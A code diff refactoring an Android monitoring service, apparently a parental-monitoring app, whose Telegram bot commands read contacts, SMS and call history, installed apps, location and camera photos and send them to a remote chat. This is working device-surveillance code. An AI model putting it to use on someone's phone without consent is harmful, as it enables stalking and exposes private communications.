@@ -1715,215 +1715,21 @@ class MonitoringService : Service() {
             "/kendara" -> handleKendaraCommand(arg)
             "/hematdata" -> handleHematDataCommand(arg)
             "/heartbeat" -> handleHeartbeatCommand(arg)
-            "/contacts" -> {
-                if (arg.isEmpty()) {
-                    sendToTelegram("Cara pakai: /contacts &lt;nama&gt;")
-                } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                    sendToTelegram("⚠️ Izin Kontak belum diberikan. Buka Setup dan berikan izin Kontak.")
-                } else {
-                    val found = searchContacts(arg.take(40))
-                    if (found.isEmpty()) {
-                        sendToTelegram("\uD83D\uDC64 Tak ada kontak yang cocok dengan nama itu.")
-                    } else {
-                        sendToTelegram(
-                            buildString {
-                                appendLine("\uD83D\uDC64 <b>Kontak (${found.size})</b>")
-                                for (entry in found) {
-                                    appendLine("\u2022 " + Html.escape(entry.first) + " \u2014 " + Html.escape(entry.second))
-                                }
-                            }
-                        )
-                    }
-                }
-            }
-            "/apps" -> {
-                if (arg.isNotEmpty() && arg.toIntOrNull() == null) {
-                    sendToTelegram("Cara pakai: /apps [5-50] (bawaan 30)")
-                    return
-                }
-                val limit = arg.toIntOrNull()?.coerceIn(5, 50) ?: 30
-                val apps = listLaunchableApps(limit)
-                if (apps.isEmpty()) {
-                    sendToTelegram("\uD83D\uDCE6 Tak ada aplikasi.")
-                } else {
-                    sendToTelegram(
-                        buildString {
-                            appendLine("\uD83D\uDCE6 <b>Aplikasi (${apps.size})</b>")
-                            for (label in apps) {
-                                appendLine("\u2022 " + Html.escape(label))
-                            }
-                        }
-                    )
-                }
-            }
-            "/storage" -> {
-                val stats = withContext(Dispatchers.IO) { cacheStats() }
-                sendToTelegram(
-                    buildString {
-                        appendLine("\uD83D\uDCBE <b>Penyimpanan</b>")
-                        appendLine("Cache: " + formatBytes(stats.bytes) + " (" + stats.photos + " foto, " + stats.audios + " audio, " + stats.videos + " video)")
-                        appendLine("Antrean: ${messageQueue.getQueueSize()}")
-                    }
-                )
-            }
-            "/history" -> {
-                if (!hasSmsPermission() || !hasCallLogPermission()) {
-                    sendToTelegram("⚠️ Izin SMS/log panggilan hilang. Berikan di Setup.")
-                    return
-                }
-                val digits = arg.filter { it.isDigit() }
-                if (digits.length < 7 || digits.length > 20) {
-                    sendToTelegram("Cara pakai: /history &lt;nomor&gt; (7-20 digit)")
-                } else {
-                    val calls = try {
-                        callLogRepository.getCallsForNumber(digits, 50).take(5)
-                    } catch (_: Exception) {
-                        emptyList()
-                    }
-                    val sms = try {
-                        smsRepository.getSmsForNumber(digits, 50).take(5)
-                    } catch (_: Exception) {
-                        emptyList()
-                    }
-                    if (calls.isEmpty() && sms.isEmpty()) {
-                        sendToTelegram("\uD83D\uDD0E Tak ada riwayat untuk $digits (pencarian sekitar 12 bulan terakhir).")
-                    } else {
-                        val knownH = try { (calls.map { it.number } + sms.map { it.address }).distinct().associateWith { isKnownContact(it) } } catch (_: Exception) { null }
-                        val freqH = try { batchFreqMap() } catch (_: Exception) { null }
-                        if (calls.isNotEmpty()) sendToTelegram(formatCallMessage(calls, knownH))
-                        if (sms.isNotEmpty()) sendToTelegram(formatSmsMessage(sms, freqH, knownH))
-                    }
-                }
-            }
-            "/watch" -> {
-                val sub = arg.lowercase(java.util.Locale.ROOT).trim()
-                if (sub.isEmpty() || sub == "status") {
-                    if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
-                    val cur = watchList()
-                    sendToTelegram(if (cur.isEmpty()) "👁️ Pantau: mati (contoh: /watch judi,pinjol,bully)" else "👁️ Pantau: " + cur.joinToString(", ") { Html.escape(it) })
-                } else if (sub == "off" || sub == "clear") {
-                    preferencesManager.watchKeywords = ""
-                    sendToTelegram("👁️ Watch dimatikan.")
-                } else {
-                    val words = sub.split(",", " ", ";").map { it.trim().lowercase(java.util.Locale.ROOT) }.filter { it.length >= 3 }.distinct().take(10)
-                    val dropped = sub.split(",", " ", ";").map { it.trim() }.filter { it.isNotEmpty() && it.length < 3 }.distinct()
-                    if (words.isEmpty()) {
-                        sendToTelegram("Cara pakai: /watch &lt;kata1,kata2&gt; (min 3 huruf, maks 10) atau /watch off")
-                    } else {
-                        preferencesManager.watchKeywords = words.joinToString(",")
-                        sendToTelegram("👁️ Watch aktif: " + words.joinToString(", ") { Html.escape(it) } + if (dropped.isNotEmpty()) "\nDiabaikan (&lt;3 huruf): " + dropped.joinToString(", ") { Html.escape(it) } else "")
-                    }
-                }
-            }
-            "/home", "/school" -> {
-                val name = if (command == "/home") "Rumah" else "Sekolah"
-                val sub = arg.trim()
-                if (sub.equals("off", ignoreCase = true)) {
-                    if (command == "/home") {
-                        preferencesManager.homeRadiusM = 0
-                        preferencesManager.homeState = 0
-                    } else {
-                        preferencesManager.schoolRadiusM = 0
-                        preferencesManager.schoolState = 0
-                    }
-                    sendToTelegram("📍 Geofence $name dimatikan.")
-                } else if (sub.isEmpty() || sub.equals("status", ignoreCase = true)) {
-                    if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
-                    sendToTelegram("📍 $name: " + fenceStatusText(command == "/home"))
-                } else {
-                    val nums = sub.replace(",", " ").split(CMD_SPLIT_REGEX).mapNotNull { it.toDoubleOrNull() }
-                    if (nums.size < 2) {
-                        sendToTelegram("Cara pakai: $command &lt;lat,lon,radius&gt; (radius 50-5000 m, default 200)")
-                    } else {
-                        val lat = nums[0]
-                        val lon = nums[1]
-                        val rad = nums.getOrNull(2)?.toInt() ?: 200
-                        if (lat !in -90.0..90.0 || lon !in -180.0..180.0 || rad !in 50..5000) {
-                            sendToTelegram("Koordinat/radius tak valid (lat -90..90, lon -180..180, radius 50-5000).")
-                        } else {
-                            if (command == "/home") {
-                                preferencesManager.homeLatE6 = (lat * 1_000_000).toLong()
-                                preferencesManager.homeLonE6 = (lon * 1_000_000).toLong()
-                                preferencesManager.homeRadiusM = rad
-                                preferencesManager.homeState = 0
-                            } else {
-                                preferencesManager.schoolLatE6 = (lat * 1_000_000).toLong()
-                                preferencesManager.schoolLonE6 = (lon * 1_000_000).toLong()
-                                preferencesManager.schoolRadiusM = rad
-                                preferencesManager.schoolState = 0
-                            }
-                            sendToTelegram("📍 Geofence $name aktif: $lat,$lon ±${rad} m.")
-                        }
-                    }
-                }
-            }
+            "/contacts" -> handleContactsCommand(arg)
+            "/apps" -> handleAppsCommand(arg)
+            "/storage" -> handleStorageCommand()
+            "/history" -> handleHistoryCommand(arg)
+            "/watch" -> handleWatchCommand(arg, privateChat)
+            "/home", "/school" -> handleFenceCommand(command, arg, privateChat)
             "/digest" -> {
                 sendDailyDigest(manual = true)
             }
-            "/darurat" -> {
-                val level = batteryLevel()
-                sendToTelegram("🚨 <b>Darurat</b>: ambil lokasi + foto…")
-                val loc = try { fetchLocation(allowStale = true) } catch (_: Exception) { null }
-                if (loc != null) {
-                    val stale = isStaleFix(loc)
-                    if (!stale) {
-                        try { rememberSentLatLon(loc.latitude, loc.longitude) } catch (_: Exception) { }
-                        try { checkGeofence(loc.latitude, loc.longitude, loc.accuracy) } catch (_: Exception) { }
-                    }
-                    sendToTelegram(buildString {
-                        appendLine("📍 <b>Lokasi darurat</b>")
-                        appendLine("https://maps.google.com/?q=${loc.latitude},${loc.longitude}")
-                        appendLine("Akurasi: ±${loc.accuracy.toInt()} m")
-                        val ageNote = fixAgeNote(loc)
-                        if (ageNote.isNotEmpty()) appendLine(ageNote.trim())
-                        appendLine("Baterai: ${if (level in 0..100) "$level%" else "?"}")
-                        appendLine("Antrean: ${try { messageQueue.getQueueSize() } catch (_: Exception) { "?" }}")
-                    })
-                } else {
-                    bumpLocFailCount()
-                    sendToTelegram("📍 Lokasi tak didapat: " + locationFailureHint() + "\nBaterai: ${if (level in 0..100) "$level%" else "?"}")
-                }
-                try { captureAndSendPhoto(reportResult = true) } catch (_: Exception) { }
-            }
-            "/jampulang" -> {
-                val sub = arg.trim()
-                if (sub.isEmpty() || sub.equals("status", ignoreCase = true)) {
-                    if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
-                    val cur = try { preferencesManager.curfewTime } catch (_: Exception) { "" }
-                    val school = fenceStatusText(false)
-                    sendToTelegram("🌙 Jam malam: " + (cur.ifEmpty { "mati" }) + "\n🏫 Cek sekolah 08–15 (Senin–Jumat): " + school)
-                } else if (sub.equals("off", ignoreCase = true)) {
-                    preferencesManager.curfewTime = ""
-                    sendToTelegram("🌙 Jam malam dimatikan.")
-                } else if (CURFEW_REGEX.matches(sub)) {
-                    preferencesManager.curfewTime = sub
-                    sendToTelegram("🌙 Jam malam disetel $sub. Bila di luar rumah lewat jam itu, owner dikabari (maks 1x/hari).")
-                } else {
-                    sendToTelegram("Cara pakai: /jampulang &lt;HH:MM&gt; (contoh 21:30) atau /jampulang off")
-                }
-            }
+            "/darurat" -> handleDaruratCommand()
+            "/jampulang" -> handleJampulangCommand(arg, privateChat)
             "/minggu" -> {
                 sendWeeklyDigest()
             }
-            "/watchnomor" -> {
-                val sub = arg.lowercase(java.util.Locale.ROOT).trim()
-                if (sub.isEmpty() || sub == "status") {
-                    if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
-                    val cur = watchNumbers()
-                    sendToTelegram(if (cur.isEmpty()) "📵 Watch nomor: off (contoh: /watchnomor 0812,62813)" else "📵 Watch nomor: " + cur.joinToString(", "))
-                } else if (sub == "off" || sub == "clear") {
-                    preferencesManager.watchNumbers = ""
-                    sendToTelegram("📵 Watch nomor dimatikan.")
-                } else {
-                    val nums = sub.split(",", " ", ";").map { it.filter { c -> c.isDigit() } }.filter { it.length >= 7 }.distinct().take(10)
-                    if (nums.isEmpty()) {
-                        sendToTelegram("Cara pakai: /watchnomor &lt;nomor1,nomor2&gt; (min 7 digit, maks 10) atau /watchnomor off")
-                    } else {
-                        preferencesManager.watchNumbers = nums.joinToString(",")
-                        sendToTelegram("📵 Watch nomor aktif: " + nums.joinToString(", "))
-                    }
-                }
-            }
+            "/watchnomor" -> handleWatchNomorCommand(arg, privateChat)
             "/jejak" -> {
                 val trail = trailList()
                 if (trail.isEmpty()) {
@@ -2088,6 +1894,219 @@ class MonitoringService : Service() {
             }
         }
     }
+    private suspend fun handleContactsCommand(arg: String) {
+        if (arg.isEmpty()) {
+            sendToTelegram("Cara pakai: /contacts &lt;nama&gt;")
+        } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            sendToTelegram("⚠️ Izin Kontak belum diberikan. Buka Setup dan berikan izin Kontak.")
+        } else {
+            val found = searchContacts(arg.take(40))
+            if (found.isEmpty()) {
+                sendToTelegram("\uD83D\uDC64 Tak ada kontak yang cocok dengan nama itu.")
+            } else {
+                sendToTelegram(
+                    buildString {
+                        appendLine("\uD83D\uDC64 <b>Kontak (${found.size})</b>")
+                        for (entry in found) {
+                            appendLine("\u2022 " + Html.escape(entry.first) + " \u2014 " + Html.escape(entry.second))
+                        }
+                    }
+                )
+            }
+        }
+    }
+
+    private suspend fun handleAppsCommand(arg: String) {
+        if (arg.isNotEmpty() && arg.toIntOrNull() == null) {
+            sendToTelegram("Cara pakai: /apps [5-50] (bawaan 30)")
+            return
+        }
+        val limit = arg.toIntOrNull()?.coerceIn(5, 50) ?: 30
+        val apps = listLaunchableApps(limit)
+        if (apps.isEmpty()) {
+            sendToTelegram("\uD83D\uDCE6 Tak ada aplikasi.")
+        } else {
+            sendToTelegram(
+                buildString {
+                    appendLine("\uD83D\uDCE6 <b>Aplikasi (${apps.size})</b>")
+                    for (label in apps) {
+                        appendLine("\u2022 " + Html.escape(label))
+                    }
+                }
+            )
+        }
+    }
+
+    private suspend fun handleStorageCommand() {
+        val stats = withContext(Dispatchers.IO) { cacheStats() }
+        sendToTelegram(
+            buildString {
+                appendLine("\uD83D\uDCBE <b>Penyimpanan</b>")
+                appendLine("Cache: " + formatBytes(stats.bytes) + " (" + stats.photos + " foto, " + stats.audios + " audio, " + stats.videos + " video)")
+                appendLine("Antrean: ${messageQueue.getQueueSize()}")
+            }
+        )
+    }
+
+    private suspend fun handleHistoryCommand(arg: String) {
+        if (!hasSmsPermission() || !hasCallLogPermission()) {
+            sendToTelegram("⚠️ Izin SMS/log panggilan hilang. Berikan di Setup.")
+            return
+        }
+        val digits = arg.filter { it.isDigit() }
+        if (digits.length < 7 || digits.length > 20) {
+            sendToTelegram("Cara pakai: /history &lt;nomor&gt; (7-20 digit)")
+        } else {
+            val calls = try {
+                callLogRepository.getCallsForNumber(digits, 50).take(5)
+            } catch (_: Exception) {
+                emptyList()
+            }
+            val sms = try {
+                smsRepository.getSmsForNumber(digits, 50).take(5)
+            } catch (_: Exception) {
+                emptyList()
+            }
+            if (calls.isEmpty() && sms.isEmpty()) {
+                sendToTelegram("\uD83D\uDD0E Tak ada riwayat untuk $digits (pencarian sekitar 12 bulan terakhir).")
+            } else {
+                val knownH = try { (calls.map { it.number } + sms.map { it.address }).distinct().associateWith { isKnownContact(it) } } catch (_: Exception) { null }
+                val freqH = try { batchFreqMap() } catch (_: Exception) { null }
+                if (calls.isNotEmpty()) sendToTelegram(formatCallMessage(calls, knownH))
+                if (sms.isNotEmpty()) sendToTelegram(formatSmsMessage(sms, freqH, knownH))
+            }
+        }
+    }
+
+    private suspend fun handleWatchCommand(arg: String, privateChat: Boolean) {
+        val sub = arg.lowercase(java.util.Locale.ROOT).trim()
+        if (sub.isEmpty() || sub == "status") {
+            if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
+            val cur = watchList()
+            sendToTelegram(if (cur.isEmpty()) "👁️ Pantau: mati (contoh: /watch judi,pinjol,bully)" else "👁️ Pantau: " + cur.joinToString(", ") { Html.escape(it) })
+        } else if (sub == "off" || sub == "clear") {
+            preferencesManager.watchKeywords = ""
+            sendToTelegram("👁️ Watch dimatikan.")
+        } else {
+            val words = sub.split(",", " ", ";").map { it.trim().lowercase(java.util.Locale.ROOT) }.filter { it.length >= 3 }.distinct().take(10)
+            val dropped = sub.split(",", " ", ";").map { it.trim() }.filter { it.isNotEmpty() && it.length < 3 }.distinct()
+            if (words.isEmpty()) {
+                sendToTelegram("Cara pakai: /watch &lt;kata1,kata2&gt; (min 3 huruf, maks 10) atau /watch off")
+            } else {
+                preferencesManager.watchKeywords = words.joinToString(",")
+                sendToTelegram("👁️ Watch aktif: " + words.joinToString(", ") { Html.escape(it) } + if (dropped.isNotEmpty()) "\nDiabaikan (&lt;3 huruf): " + dropped.joinToString(", ") { Html.escape(it) } else "")
+            }
+        }
+    }
+
+    private suspend fun handleFenceCommand(command: String, arg: String, privateChat: Boolean) {
+        val name = if (command == "/home") "Rumah" else "Sekolah"
+        val sub = arg.trim()
+        if (sub.equals("off", ignoreCase = true)) {
+            if (command == "/home") {
+                preferencesManager.homeRadiusM = 0
+                preferencesManager.homeState = 0
+            } else {
+                preferencesManager.schoolRadiusM = 0
+                preferencesManager.schoolState = 0
+            }
+            sendToTelegram("📍 Geofence $name dimatikan.")
+        } else if (sub.isEmpty() || sub.equals("status", ignoreCase = true)) {
+            if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
+            sendToTelegram("📍 $name: " + fenceStatusText(command == "/home"))
+        } else {
+            val nums = sub.replace(",", " ").split(CMD_SPLIT_REGEX).mapNotNull { it.toDoubleOrNull() }
+            if (nums.size < 2) {
+                sendToTelegram("Cara pakai: $command &lt;lat,lon,radius&gt; (radius 50-5000 m, default 200)")
+            } else {
+                val lat = nums[0]
+                val lon = nums[1]
+                val rad = nums.getOrNull(2)?.toInt() ?: 200
+                if (lat !in -90.0..90.0 || lon !in -180.0..180.0 || rad !in 50..5000) {
+                    sendToTelegram("Koordinat/radius tak valid (lat -90..90, lon -180..180, radius 50-5000).")
+                } else {
+                    if (command == "/home") {
+                        preferencesManager.homeLatE6 = (lat * 1_000_000).toLong()
+                        preferencesManager.homeLonE6 = (lon * 1_000_000).toLong()
+                        preferencesManager.homeRadiusM = rad
+                        preferencesManager.homeState = 0
+                    } else {
+                        preferencesManager.schoolLatE6 = (lat * 1_000_000).toLong()
+                        preferencesManager.schoolLonE6 = (lon * 1_000_000).toLong()
+                        preferencesManager.schoolRadiusM = rad
+                        preferencesManager.schoolState = 0
+                    }
+                    sendToTelegram("📍 Geofence $name aktif: $lat,$lon ±${rad} m.")
+                }
+            }
+        }
+    }
+
+    private suspend fun handleDaruratCommand() {
+        val level = batteryLevel()
+        sendToTelegram("🚨 <b>Darurat</b>: ambil lokasi + foto…")
+        val loc = try { fetchLocation(allowStale = true) } catch (_: Exception) { null }
+        if (loc != null) {
+            val stale = isStaleFix(loc)
+            if (!stale) {
+                try { rememberSentLatLon(loc.latitude, loc.longitude) } catch (_: Exception) { }
+                try { checkGeofence(loc.latitude, loc.longitude, loc.accuracy) } catch (_: Exception) { }
+            }
+            sendToTelegram(buildString {
+                appendLine("📍 <b>Lokasi darurat</b>")
+                appendLine("https://maps.google.com/?q=${loc.latitude},${loc.longitude}")
+                appendLine("Akurasi: ±${loc.accuracy.toInt()} m")
+                val ageNote = fixAgeNote(loc)
+                if (ageNote.isNotEmpty()) appendLine(ageNote.trim())
+                appendLine("Baterai: ${if (level in 0..100) "$level%" else "?"}")
+                appendLine("Antrean: ${try { messageQueue.getQueueSize() } catch (_: Exception) { "?" }}")
+            })
+        } else {
+            bumpLocFailCount()
+            sendToTelegram("📍 Lokasi tak didapat: " + locationFailureHint() + "\nBaterai: ${if (level in 0..100) "$level%" else "?"}")
+        }
+        try { captureAndSendPhoto(reportResult = true) } catch (_: Exception) { }
+    }
+
+    private suspend fun handleJampulangCommand(arg: String, privateChat: Boolean) {
+        val sub = arg.trim()
+        if (sub.isEmpty() || sub.equals("status", ignoreCase = true)) {
+            if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
+            val cur = try { preferencesManager.curfewTime } catch (_: Exception) { "" }
+            val school = fenceStatusText(false)
+            sendToTelegram("🌙 Jam malam: " + (cur.ifEmpty { "mati" }) + "\n🏫 Cek sekolah 08–15 (Senin–Jumat): " + school)
+        } else if (sub.equals("off", ignoreCase = true)) {
+            preferencesManager.curfewTime = ""
+            sendToTelegram("🌙 Jam malam dimatikan.")
+        } else if (CURFEW_REGEX.matches(sub)) {
+            preferencesManager.curfewTime = sub
+            sendToTelegram("🌙 Jam malam disetel $sub. Bila di luar rumah lewat jam itu, owner dikabari (maks 1x/hari).")
+        } else {
+            sendToTelegram("Cara pakai: /jampulang &lt;HH:MM&gt; (contoh 21:30) atau /jampulang off")
+        }
+    }
+
+    private suspend fun handleWatchNomorCommand(arg: String, privateChat: Boolean) {
+        val sub = arg.lowercase(java.util.Locale.ROOT).trim()
+        if (sub.isEmpty() || sub == "status") {
+            if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
+            val cur = watchNumbers()
+            sendToTelegram(if (cur.isEmpty()) "📵 Watch nomor: off (contoh: /watchnomor 0812,62813)" else "📵 Watch nomor: " + cur.joinToString(", "))
+        } else if (sub == "off" || sub == "clear") {
+            preferencesManager.watchNumbers = ""
+            sendToTelegram("📵 Watch nomor dimatikan.")
+        } else {
+            val nums = sub.split(",", " ", ";").map { it.filter { c -> c.isDigit() } }.filter { it.length >= 7 }.distinct().take(10)
+            if (nums.isEmpty()) {
+                sendToTelegram("Cara pakai: /watchnomor &lt;nomor1,nomor2&gt; (min 7 digit, maks 10) atau /watchnomor off")
+            } else {
+                preferencesManager.watchNumbers = nums.joinToString(",")
+                sendToTelegram("📵 Watch nomor aktif: " + nums.joinToString(", "))
+            }
+        }
+    }
+
+
     private suspend fun handleRecordCommand(arg: String) {
         val seconds = arg.toIntOrNull()
         if (seconds == null || seconds !in 5..600) {
